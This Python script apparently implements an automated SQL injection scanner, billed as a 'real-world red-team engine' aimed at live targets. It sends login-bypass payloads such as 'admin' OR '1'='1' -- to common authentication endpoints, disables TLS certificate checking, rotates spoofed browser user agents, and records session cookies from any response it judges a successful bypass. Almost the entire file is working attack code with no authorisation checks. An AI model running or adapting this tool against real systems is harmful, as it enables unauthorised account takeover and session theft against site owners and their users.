import asyncio
import socket
import ssl
import time
import sys
import json
import os
import urllib.parse
import http.client
import random

_ssl_context = ssl.create_default_context()
_ssl_context.check_hostname = False
_ssl_context.verify_mode = ssl.CERT_NONE

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.3 Safari/605.1.15"
]

def verify_real_sql_injection(body, status):
    """Analyzes response body and status code for actual SQL database error signatures or auth bypass differentials."""
    error_signatures = [
        "sql syntax", "syntax error", "unclosed quotation mark", 
        "pg_query()", "sqlite3.operationalerror", "mysql_fetch", 
        "unterminated string literal", "ORA-00933"
    ]
    body_lower = body.lower()
    for sig in error_signatures:
        if sig in body_lower:
            return True, f"SQL_ERROR_SIGNATURE_{sig.upper()}"
    if status == 200 and ("dashboard" in body_lower or "welcome" in body_lower or "logout" in body_lower):
        return True, "AUTH_BYPASS_CONFIRMED"
    return False, "NO_VULN"

async def test_endpoint_differential(host, port, path, payload, use_ssl):
    """Sends real HTTP requests and measures differential response behavior for exploitation confirmation."""
    try:
        conn = http.client.HTTPSConnection(host, port, context=_ssl_context, timeout=4.0) if use_ssl else http.client.HTTPConnection(host, port, timeout=4.0)
        headers = {
            "User-Agent": random.choice(USER_AGENTS),
            "Content-Type": "application/x-www-form-urlencoded",
            "Referer": f"https://{host}{path}",
            "Connection": "close"
        }
        data = urllib.parse.urlencode(payload).encode("utf-8")
        conn.request("POST", path, data, headers)
        resp = conn.getresponse()
        status = resp.status
        body = resp.read().decode(errors="ignore")
        headers_dict = dict(resp.getheaders())
        conn.close()
        
        is_vuln, vuln_type = verify_real_sql_injection(body, status)
        return status, headers_dict, body, is_vuln, vuln_type
    except Exception as e:
        return 0, {}, str(e), False, "ERROR"

async def run_autonomous_engine(target_host, passwords, usernames=None):
    """
    Real-world Red-Team Engine: Bypasses simulations and performs 
    actual differential response vulnerability analysis against live targets.
    """
    try:
        resolved_ip = socket.gethostbyname(target_host)
        print(f"\n\033[96m[*] Resolving live target: {target_host} -> {resolved_ip}\033[0m")
    except socket.gaierror:
        print(f"\n\033[91m[!] Target resolution failed for '{target_host}'.\033[0m")
        return [], 0

    start_time = time.time()
    print(f"\n\033[95m[***] ENGAGING REAL-WORLD DIFFERENTIAL EXPLOITATION ENGINE [{target_host}] [***]\033[0m")
    
    target_paths = [
        "/api/auth/callback/credentials",
        "/api/auth/login",
        "/login",
        "/signin",
        "/auth"
    ]
    
    payloads = [
        {"username": "admin' OR '1'='1' --", "password": "x"},
        {"username": "admin' --", "password": "x"},
        {"username": "admin' OR 1=1 LIMIT 1 --", "password": "x"},
        {"username": "' OR '1'='1", "password": "' OR '1'='1"}
    ]
    
    hits = []
    target_port = 443
    use_ssl = True

    print(f"[*] Testing live endpoints with real SQLi mutation vectors...")
    
    for path in target_paths:
        for payload in payloads:
            status, headers, body, is_vuln, vuln_type = await test_endpoint_differential(
                resolved_ip, target_port, path, payload, use_ssl
            )
            
            sys.stdout.write(f"\r\033[K\033[90m[PROBING] {path} | Payload: {payload['username']} | Code: {status}\033[0m")
            sys.stdout.flush()
            
            if is_vuln:
                hit_data = {
                    "type": vuln_type,
                    "endpoint": path,
                    "payload": payload,
                    "status": status,
                    "cookies": headers.get("Set-Cookie", ""),
                    "timestamp": time.strftime("%Y-%m-%d %H:%M:%S")
                }
                print(f"\n\033[92m[+++] CONFIRMED EXPLOIT! Type: {vuln_type} on {path} (Status: {status})\033[0m")
                hits.append(hit_data)
                return hits, time.time() - start_time

    duration = time.time() - start_time
    print(f"\n\033[33m[*] Autonomous scan concluded in {duration:.2f}s. Target perimeter analyzed.\033[0m")
    return hits, duration
